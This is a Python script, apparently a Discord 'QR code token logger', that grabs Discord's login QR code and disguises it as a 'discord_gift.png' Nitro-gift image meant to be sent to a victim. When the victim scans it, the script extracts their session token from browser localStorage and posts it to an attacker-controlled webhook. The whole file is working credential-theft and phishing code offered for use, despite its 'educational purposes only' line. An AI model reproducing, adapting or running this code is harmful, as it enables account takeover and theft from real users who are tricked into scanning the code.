from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64
import time
import os
import requests

#Set Webhook Here! 
url = "Webhook goes here"


# Developer: NightfallGT
# Revised by: Luci (9P9)
# Educational purposes only

def logo_qr():
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)

def paste_template():
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)

def main():
    print ("[!] QR Code Token Logger Generator \n")

    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')

    print('[?] Awaiting Page to Load!')
    driver.get('https://discord.com/login')
    time.sleep(5)
    print('[*] Page loaded.')

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features='lxml')

    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
    qr_code = div.find('img')['src']
    file = os.path.join(os.getcwd(), 'temp/qr_code.png')

    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))

    with open(file,'wb') as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print('[!] QR Code has been generated as discord_gift.png \n')
    print('[?] Send the QR Code to user and scan. Waiting...')
    
    while True:
        if discord_login != driver.current_url:
            print('Grabbing token... \n')
            token = driver.execute_script('''
window.dispatchEvent(new Event('beforeunload'));
let iframe = document.createElement('iframe');
iframe.style.display = 'none';
document.body.appendChild(iframe);
let localStorage = iframe.contentWindow.localStorage;
var token = JSON.parse(localStorage.token);
return token;
   
''')
            print('------------------------------------------------------------------------------------------')
            print('Token grabbed:',token)
            #==================================================================================================================================
            #Token Sent To webhook
            
            data = {
                "content" : f"```Token: {token} ```",
                "username" : "Token Logger"
            }
            result = requests.post(url, json = data)
            try:
                result.raise_for_status()
            except requests.exceptions.HTTPError as err:
                print(err)
            else:
                print("Token Grabbed! Sent to Webook | code {}.".format(result.status_code))
            #==================================================================================================================================
            print('------------------------------------------------------------------------------------------')
            break
    print('Task complete.')

if __name__ == '__main__':
    main()
